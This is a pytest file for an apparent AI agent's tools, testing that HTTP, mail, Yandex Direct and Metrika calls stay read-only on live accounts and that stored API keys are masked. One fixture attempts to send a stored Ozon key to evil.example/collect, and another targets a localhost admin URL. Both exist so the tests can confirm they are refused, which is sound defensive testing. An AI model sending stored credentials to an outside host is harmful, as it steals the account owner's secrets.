"""http_request, mail_read, direct_api, metrika_read, the knowledge base and the «study first» step.

Every tool that reaches a live account is tested for the same thing: a write never leaves the server.
"""

import base64
import email.message
import json
from datetime import datetime, timedelta, timezone

import httpx
import pytest

from app.agent import http_tool, mail, yandex_direct
from app.agent.loop import STUDY_GATE, STUDY_NOTE, Budget, ToolResult, run_agent
from app.llm.client import Completion, ToolCall
from app.models import KnowledgeNote, User
from app.vault import store_credential

KEY = base64.b64encode(b"k" * 32).decode()
OZON_KEY = "ozon-api-key-0123456789"
DIRECT_TOKEN = "y0_AgAAAA-direct-token-xyz"
PUBLIC_DNS = lambda host, port: [(0, 0, 0, "", ("93.158.134.3", port))]  # noqa: E731


def _user(session, email_addr="biz@example.com") -> User:
    user = User(email=email_addr, consent_pdn=True, consent_training=False, is_admin=False,
                created_at=datetime.now(timezone.utc))
    session.add(user)
    session.flush()
    return user


def _never(request: httpx.Request) -> httpx.Response:  # pragma: no cover - must not be reached
    raise AssertionError(f"request must not be sent: {request.method} {request.url}")


# --- http_request ------------------------------------------------------------------


@pytest.mark.parametrize(
    ("method", "url", "body"),
    [
        ("GET", "https://api-seller.ozon.ru/v3/product/info/stocks", None),
        ("POST", "https://api-seller.ozon.ru/v3/product/list", {"filter": {}}),
        ("POST", "https://api-seller.ozon.ru/v2/product/info", {"product_id": 1}),
        ("POST", "https://api.direct.yandex.com/json/v5/campaigns", {"method": "get", "params": {}}),
        ("POST", "https://api.direct.yandex.com/json/v5/reports", {"params": {}}),
        ("POST", "https://api-sandbox.direct.yandex.com/json/v5/campaigns", {"method": "add", "params": {}}),
        ("DELETE", "https://api-sandbox.direct.yandex.com/json/v5/campaigns", None),
    ],
)
def test_http_policy_allows_reads_and_sandbox_writes(method, url, body) -> None:
    assert http_tool.check_policy(method, url, body) in {"read", "sandbox"}


@pytest.mark.parametrize(
    ("method", "url", "body"),
    [
        ("POST", "https://api-seller.ozon.ru/v1/product/import/prices", {"prices": []}),
        ("POST", "https://api-seller.ozon.ru/v2/products/stocks", {"stocks": []}),
        ("POST", "https://api-seller.ozon.ru/v1/product/archive", {}),
        ("POST", "https://api-seller.ozon.ru/v2/product/info/delete", {}),
        ("POST", "https://api.direct.yandex.com/json/v5/campaigns", {"method": "update", "params": {}}),
        ("POST", "https://api.direct.yandex.com/json/v5/keywordbids", {"method": "set", "params": {}}),
        ("POST", "https://api.direct.yandex.com/json/v5/campaigns", {"method": "suspend"}),
        ("POST", "https://api.direct.yandex.ru/json/v5/ads", {"method": "add"}),
        ("PUT", "https://api-seller.ozon.ru/v3/product/list", {}),
        ("PATCH", "https://api.moysklad.ru/api/remap/1.2/entity/product/1", {}),
        ("DELETE", "https://api.moysklad.ru/api/remap/1.2/entity/product/1", None),
        ("POST", "https://example.com/anything", {}),
    ],
)
def test_http_policy_refuses_writes_to_live_accounts(method, url, body) -> None:
    with pytest.raises(http_tool.HttpToolError) as exc:
        http_tool.check_policy(method, url, body)
    assert exc.value.code == "write_forbidden"


def test_http_write_to_a_live_account_never_sends_a_request(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "api-seller.ozon.ru", "123456", OZON_KEY)
    result = http_tool.execute(
        session, user, None, "http_request",
        {"method": "POST", "url": "https://api-seller.ozon.ru/v1/product/import/prices",
         "headers": {"Api-Key": "{{secret:api-seller.ozon.ru}}"}, "json": {"prices": []}},
        transport=httpx.MockTransport(_never), resolver=PUBLIC_DNS,
    )
    assert result.error == "write_forbidden" and OZON_KEY not in result.content


def test_http_secret_goes_only_to_its_host_and_never_back_to_the_model(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "api-seller.ozon.ru", "123456", OZON_KEY)
    seen = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        # A careless API that echoes the key back.
        return httpx.Response(200, json={"result": {"items": [{"sku": 1, "present": 7}]}, "echo": request.headers["Api-Key"]})

    result = http_tool.execute(
        session, user, None, "http_request",
        {"method": "POST", "url": "https://api-seller.ozon.ru/v3/product/list",
         "headers": {"Client-Id": "123456", "Api-Key": "{{secret:api-seller.ozon.ru}}"}, "json": {"limit": 10}},
        transport=httpx.MockTransport(handler), resolver=PUBLIC_DNS,
    )
    assert result.error is None and '"present": 7' in result.content
    assert seen[0].headers["Api-Key"] == OZON_KEY and seen[0].url.host == "api-seller.ozon.ru"
    assert OZON_KEY not in result.content and "<CREDENTIAL>" in result.content

    # The same placeholder aimed at another host is refused before any request.
    stolen = http_tool.execute(
        session, user, None, "http_request",
        {"method": "GET", "url": "https://evil.example/collect", "query": {"k": "{{secret:api-seller.ozon.ru}}"}},
        transport=httpx.MockTransport(_never), resolver=PUBLIC_DNS,
    )
    assert stolen.error == "secret_wrong_site" and OZON_KEY not in stolen.content
    missing = http_tool.execute(
        session, user, None, "http_request",
        {"method": "GET", "url": "https://api.example.ru/x", "headers": {"X": "{{secret:api.example.ru}}"}},
        transport=httpx.MockTransport(_never), resolver=PUBLIC_DNS,
    )
    assert missing.error == "secret_not_found"


def test_http_refuses_private_addresses() -> None:
    with pytest.raises(http_tool.HttpToolError) as exc:
        http_tool.prepare({"method": "GET", "url": "http://127.0.0.1:8000/v1/admin"}, lambda name: None)
    assert exc.value.code == "blocked_address"


def test_http_tool_does_not_need_confirmation_but_is_server_side() -> None:
    from app.agent.guard import risky_tool

    assert not risky_tool("http_request")
    assert risky_tool("mail_send")


# --- mail ---------------------------------------------------------------------------


def _letter() -> bytes:
    msg = email.message.EmailMessage()
    msg["From"] = "Поставщик <supply@example.com>"
    msg["To"] = "owner@example.com"
    msg["Subject"] = "Счёт №15 на перчатки"
    msg["Date"] = "Thu, 05 Nov 2026 10:00:00 +0300"
    msg.set_content("Добрый день! Счёт на 12 500 ₽, оплатить до 10.11.2026.")
    msg.add_attachment("артикул;кол-во\nGL-M-100;20\n".encode(), maintype="text", subtype="csv", filename="заказ.csv")
    return msg.as_bytes()


class FakeImap:
    def __init__(self) -> None:
        self.commands: list[tuple] = []
        self.readonly = None

    def list(self):
        return "OK", [b'(\\HasNoChildren) "|" "INBOX"', b'(\\HasNoChildren) "|" "Sent"']

    def select(self, folder, readonly=False):
        self.commands.append(("SELECT", folder, readonly))
        self.readonly = readonly
        return "OK", [b"1"]

    def uid(self, command, *args):
        self.commands.append((command, *args))
        if command == "SEARCH":
            return "OK", [b"7"]
        if command == "FETCH":
            return "OK", [(b"7 (UID 7 BODY[] {100}", _letter()), b")"]
        raise AssertionError(command)

    def store(self, *args):  # pragma: no cover
        raise AssertionError("STORE must never be called")

    def logout(self):
        self.commands.append(("LOGOUT",))


def test_mail_reads_with_peek_and_examine_and_never_writes(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "imap.yandex.ru", "owner@example.com", "app-password-1")
    fake = FakeImap()
    connector = lambda host, login, password: (host, login, password) == ("imap.yandex.ru", "owner@example.com", "app-password-1") and fake  # noqa: E731

    listed = mail.execute(session, user, None, "mail_read", {"action": "search", "from": "supply@example.com"}, connector=connector)
    read = mail.execute(session, user, None, "mail_read", {"action": "read", "uid": "7"}, connector=connector)
    attached = mail.execute(session, user, None, "mail_read", {"action": "attachment", "uid": "7", "index": 1}, connector=connector)

    assert "Счёт №15" in listed.content and "uid 7" in listed.content
    assert "12 500 ₽" in read.content and "заказ.csv" in read.content
    assert "GL-M-100;20" in attached.content
    assert fake.readonly is True
    fetches = [c for c in fake.commands if c[0] == "FETCH"]
    assert fetches and all("PEEK" in c[2] for c in fetches)
    assert not any(c[0] in {"STORE", "COPY", "MOVE", "EXPUNGE"} for c in fake.commands)
    assert "app-password-1" not in listed.content + read.content


def test_mail_readonly_wrapper_refuses_writes() -> None:
    imap = mail.ReadOnlyImap(FakeImap())
    with pytest.raises(mail.MailError):
        imap.fetch("7", "(BODY[])")
    with pytest.raises(mail.MailError):
        imap.search(["STORE"])


def test_mail_send_is_off_by_default_and_needs_confirmation(session, monkeypatch) -> None:
    from app.agent.tools import client_tool_names

    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    monkeypatch.delenv("HELI_MAIL_SEND", raising=False)
    mail.register()
    assert "mail_send" not in client_tool_names()
    user = _user(session)
    store_credential(session, user, "imap.yandex.ru", "owner@example.com", "app-password-1")
    result = mail.execute(session, user, None, "mail_send", {"to": "a@example.com", "subject": "x", "body": "y"})
    assert result.error == "send_disabled"


def test_mail_ignores_api_tokens_saved_for_yandex(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "yandex.ru", "token", DIRECT_TOKEN)
    assert mail.mailbox_for(session, user) is None


# --- Директ и Метрика ---------------------------------------------------------------


def test_direct_live_account_is_read_only() -> None:
    url, headers, body, is_report = yandex_direct.build_direct(
        {"service": "campaigns", "method": "get", "params": {"SelectionCriteria": {}}, "client_login": "client-1"}
    )
    assert url == "https://api.direct.yandex.com/json/v5/campaigns" and headers["Client-Login"] == "client-1"
    assert body["method"] == "get" and not is_report
    for method in ("add", "update", "delete", "suspend", "resume", "archive", "set", "setAuto"):
        with pytest.raises(yandex_direct.DirectError) as exc:
            yandex_direct.build_direct({"service": "campaigns", "method": method})
        assert exc.value.code == "write_forbidden"
    url, _, body, _ = yandex_direct.build_direct({"service": "campaigns", "method": "update", "sandbox": True})
    assert url.startswith("https://api-sandbox.direct.yandex.com/") and body["method"] == "update"


def test_direct_write_never_reaches_the_network(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "direct.yandex.ru", "token", DIRECT_TOKEN)
    result = yandex_direct.execute(session, user, None, "direct_api",
                                   {"service": "keywordbids", "method": "set", "params": {}},
                                   transport=httpx.MockTransport(_never))
    assert result.error == "write_forbidden"


def test_direct_report_waits_for_201_202_and_returns_tsv(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "direct.yandex.ru", "token", DIRECT_TOKEN)
    answers = [
        httpx.Response(201, headers={"retryIn": "2"}),
        httpx.Response(202, headers={"retryIn": "3"}),
        httpx.Response(200, text="CampaignName\tClicks\tCost\tConversions\nПерчатки\t120\t3600.5\t4\nTotal rows: 1\n"),
    ]
    seen, slept = [], []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return answers.pop(0)

    result = yandex_direct.execute(
        session, user, None, "direct_api",
        {"service": "reports", "goals": [123], "params": {
            "SelectionCriteria": {"DateFrom": "2026-10-01", "DateTo": "2026-10-31"},
            "FieldNames": ["CampaignName", "Clicks", "Cost", "Conversions"],
            "ReportName": "oct", "ReportType": "CAMPAIGN_PERFORMANCE_REPORT", "DateRangeType": "CUSTOM_DATE"}},
        transport=httpx.MockTransport(handler), sleep=slept.append,
    )
    assert result.error is None and "Перчатки\t120\t3600.5\t4" in result.content
    assert slept == [2.0, 3.0] and len(seen) == 3
    sent = json.loads(seen[0].content)
    assert sent["params"]["Goals"] == [123] and sent["params"]["Format"] == "TSV"
    assert seen[0].headers["Authorization"] == f"Bearer {DIRECT_TOKEN}"
    assert seen[0].headers["returnMoneyInMicros"] == "false"
    assert DIRECT_TOKEN not in result.content


def test_direct_report_still_building_says_to_come_back(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "direct.yandex.ru", "token", DIRECT_TOKEN)
    result = yandex_direct.execute(
        session, user, None, "direct_api", {"service": "reports", "params": {"ReportName": "x"}},
        transport=httpx.MockTransport(lambda r: httpx.Response(202, headers={"retryIn": "30"})), sleep=lambda s: None,
    )
    assert result.error == "report_pending" and "ReportName" in result.content


def test_direct_get_and_api_error(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "direct.yandex.ru", "token", DIRECT_TOKEN)
    ok = yandex_direct.execute(
        session, user, None, "direct_api", {"service": "campaigns", "params": {"SelectionCriteria": {}, "FieldNames": ["Id", "Name"]}},
        transport=httpx.MockTransport(lambda r: httpx.Response(200, headers={"Units": "10/20828/64000"},
                                                                json={"result": {"Campaigns": [{"Id": 1, "Name": "Перчатки"}]}})),
    )
    assert ok.error is None and "Перчатки" in ok.content and "10/20828/64000" in ok.content
    bad = yandex_direct.execute(
        session, user, None, "direct_api", {"service": "campaigns"},
        transport=httpx.MockTransport(lambda r: httpx.Response(200, json={"error": {"error_code": 53, "error_string": "Ошибка авторизации"}})),
    )
    assert bad.error == "api_error" and "53" in bad.content


def test_direct_without_token_explains_how_to_add_it(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    result = yandex_direct.execute(session, user, None, "direct_api", {"service": "campaigns"})
    assert result.error == "no_credential" and "oauth.yandex.ru" in result.content


def test_metrika_is_get_only_with_oauth_header(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "direct.yandex.ru", "token", DIRECT_TOKEN)
    seen = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json={"data": [{"metrics": [42]}], "totals": [42]})

    result = yandex_direct.execute(
        session, user, None, "metrika_read",
        {"report": "stat", "params": {"ids": 777, "metrics": ["ym:s:goal5reaches"], "date1": "7daysAgo"}},
        transport=httpx.MockTransport(handler),
    )
    assert result.error is None and "42" in result.content
    assert seen[0].method == "GET" and seen[0].url.host == "api-metrika.yandex.net"
    assert seen[0].headers["Authorization"] == f"OAuth {DIRECT_TOKEN}"
    with pytest.raises(yandex_direct.DirectError):
        yandex_direct.build_metrika({"report": "goals"})


# --- база знаний ------------------------------------------------------------------


def test_knowledge_seeds_hold_the_conversion_rule(session) -> None:
    from app.knowledge import relevant_notes

    notes = relevant_notes(session, "Какую стратегию поставить в Директе, оплата за конверсии?")
    assert notes and "10 конверсий в неделю" in notes[0]
    assert "Максимум кликов" in notes[0]


def test_knowledge_save_needs_a_source_masks_data_and_refreshes(session) -> None:
    from app import knowledge

    user = _user(session)
    with pytest.raises(ValueError):
        knowledge.save(session, user, "Сервис: правило", "Факт без источника", "")
    note = knowledge.save(session, user, "Сфера.Касса API: лимиты",
                          "Не больше 20 запросов в минуту на ключ; пишите на ivan@example.com", "https://docs.sfera.example/limits")
    assert "ivan@example.com" not in note.text
    again = knowledge.save(session, user, "Сфера.Касса API: лимиты",
                           "Не больше 20 запросов в минуту на ключ; пишите на ivan@example.com", "https://docs.sfera.example/limits")
    assert again.id == note.id
    found = knowledge.search(session, "лимиты Сфера.Касса")
    assert found and found[0].id == note.id


def test_knowledge_marks_old_and_flagged_notes(session) -> None:
    from app import knowledge

    user = _user(session)
    note = knowledge.save(session, user, "Ozon: комиссия", "Комиссия за категорию 10%", "https://docs.ozon.ru/x")
    assert not knowledge.is_stale(note)
    note.checked_at = datetime.now(timezone.utc) - timedelta(days=knowledge.STALE_AFTER_DAYS + 1)
    assert "устарело" in knowledge.render(note)
    fresh = knowledge.save(session, user, "Ozon: комиссия 2", "Комиссия за категорию 12%", "https://docs.ozon.ru/y")
    knowledge.mark_stale(session, str(fresh.id), "в справке теперь 15%")
    assert "устарело" in knowledge.render(fresh) and "15%" in knowledge.render(fresh)
    knowledge.ensure_seeded(session)
    rule = session.query(KnowledgeNote).filter_by(source_url=knowledge.HELI_SOURCE).first()
    rule.checked_at = datetime.now(timezone.utc) - timedelta(days=1000)
    assert not knowledge.is_stale(rule)  # the owner's rules do not age


def test_knowledge_tools(session) -> None:
    from app import knowledge

    user = _user(session)
    saved = knowledge.execute(session, user, None, "knowledge_save",
                              {"topic": "Wildberries API: остатки", "fact": "Остатки — GET /api/v3/stocks", "source_url": "https://dev.wildberries.ru/"})
    assert saved.error is None
    no_source = knowledge.execute(session, user, None, "knowledge_save", {"topic": "a", "fact": "b", "source_url": "форум"})
    assert no_source.error == "no_source"
    found = knowledge.execute(session, user, None, "knowledge_search", {"query": "остатки Wildberries"})
    assert "dev.wildberries.ru" in found.content


# --- «изучи предмет» ---------------------------------------------------------------

WRONG = "Лимит Сфера.Кассы — 100 запросов в минуту."
RIGHT = "Лимит Сфера.Кассы — 20 запросов в минуту на ключ (источник: https://docs.sfera.example/limits)."
DOCS = "Документация Сфера.Касса API: не больше 20 запросов в минуту на ключ. https://docs.sfera.example/limits"


def _model():
    """A model that answers from memory (wrong) unless the official docs are in front of it."""

    def complete(messages, tools):
        seen = " ".join(str(m.get("content")) for m in messages)
        if "20 запросов в минуту" in seen:
            return Completion("heli-fast", RIGHT, 1, 1, __import__("decimal").Decimal("0"))
        if messages[-1].get("content") == STUDY_NOTE:
            return Completion("heli-fast", "", 1, 1, __import__("decimal").Decimal("0"),
                              tool_calls=[ToolCall("s1", "web_search", json.dumps({"query": "Сфера.Касса API лимит справка"}))])
        return Completion("heli-fast", WRONG, 1, 1, __import__("decimal").Decimal("0"))

    return complete


def _search(call_id, name, args):
    assert name == "web_search"
    return ToolResult(DOCS)


TOOLS = [{"type": "function", "function": {"name": n, "parameters": {}}} for n in ("web_search", "open_url", "knowledge_search")]


def test_unfamiliar_service_wrong_without_study_right_with_it() -> None:
    task = [{"role": "user", "content": "Какой лимит запросов у API Сфера.Кассы?"}]
    without = run_agent(list(task), tools=TOOLS, call_tool=_search, complete=_model(), budget=Budget())
    assert without.final_answer == WRONG
    studied = run_agent(list(task), tools=TOOLS, call_tool=_search, complete=_model(), budget=Budget(study_first=True))
    assert studied.final_answer == RIGHT


def test_study_gate_holds_the_first_action_until_the_subject_is_studied() -> None:
    from decimal import Decimal

    calls = []
    script = [
        Completion("heli-fast", "", 1, 1, Decimal("0"), tool_calls=[ToolCall("a", "http_request", "{}")]),
        Completion("heli-fast", "", 1, 1, Decimal("0"), tool_calls=[ToolCall("b", "knowledge_search", "{}")]),
        Completion("heli-fast", "", 1, 1, Decimal("0"), tool_calls=[ToolCall("c", "http_request", "{}")]),
        Completion("heli-fast", "Готово", 1, 1, Decimal("0")),
    ]
    seen = []

    def complete(messages, tools):
        seen.append(list(messages))
        return script.pop(0)

    tools = TOOLS + [{"type": "function", "function": {"name": "http_request", "parameters": {}}}]
    out = run_agent([{"role": "user", "content": "x"}], tools=tools,
                    call_tool=lambda c, n, a: calls.append(n) or ToolResult("ок"), complete=complete,
                    budget=Budget(study_first=True))
    assert calls == ["knowledge_search", "http_request"]
    assert seen[1][-1]["content"] == STUDY_GATE and out.final_answer == "Готово"


def test_needs_study_only_for_unknown_services() -> None:
    from app.agent.task_run import needs_study

    assert needs_study("Подключи API Сфера.Кассы и проверь лимиты", 2, None, [])
    assert not needs_study("Подключи API Сфера.Кассы", 2, "гайд", [])
    assert not needs_study("Подключи API Сфера.Кассы", 2, None, ["заметка"])
    assert not needs_study("Привет, как дела?", 2, None, [])
    # «Посмотри API сервиса X» is studied whatever the classifier's complexity; a general topic needs ≥2.
    assert needs_study("Подключи API Сфера.Кассы", 1, None, [])
    assert needs_study("Посмотри API курьерской службы «Ласточка»", 0, None, [])
    assert not needs_study("Какой тариф у вас лучше?", 1, None, [])


def test_search_puts_official_docs_first(monkeypatch) -> None:
    from app.llm import tools as server_tools
    from app.web import SearchHit

    hits = [SearchHit("Форум", "https://forum.example/thread", "x"),
            SearchHit("Справка Директа", "https://yandex.ru/support/direct/strategies.html", "y")]
    monkeypatch.setattr(server_tools, "web_search", lambda q: hits)
    text, _ = server_tools.call_tool("web_search", {"query": "стратегии директ"})
    assert text.index("yandex.ru/support") < text.index("forum.example") and "официальный источник" in text
    assert server_tools.official_rank("https://docs.ozon.ru/api/seller/") == 0


def test_direct_playbook_carries_the_conversion_rule() -> None:
    from app.skills import guide_for

    guide = guide_for("Настрой стратегию в Директе для кампании")
    assert guide and "≥10 конверсий в неделю" in guide and "песочниц" in guide
